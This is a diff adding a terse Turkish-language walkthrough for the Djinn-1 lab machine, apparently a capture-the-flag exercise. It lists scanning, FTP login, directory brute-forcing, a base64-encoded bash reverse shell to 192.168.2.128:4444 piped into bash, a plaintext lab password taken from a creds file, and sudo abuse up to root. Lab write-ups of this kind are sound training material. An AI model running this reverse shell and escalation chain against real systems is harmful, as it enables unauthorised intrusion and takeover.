@@ -1,0 +1,11 @@
+DJINN-1 MAKİNE ÇÖZÜMÜ
+1 - IP adresi 192.168.2.73 cihazın ekranında yazıyor.
+2 -  nmap -sT -A 192.168.2.73
+3 - ftp 192.168.2.73, nitu:81299
+4 - gobuster dir -u http://192.168.2.73:7331 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+5 - http://192.168.2.73:7331/wish 
+6 - echo "bash -i >& /dev/tcp/192.168.2.128/4444 0>&1" | base64
+7 - echo base64_hash | base64 -d | bash
+8 - cd /home/nitish, ls -la, cd .dev, cat creds.txt, nitish:p4ssw0rdStr3r0n9
+9 - sudo -l, sudo -u sam genie -cmd new
+10 - sudo -l, sudo -u root /root/lago, 2, num, whoami
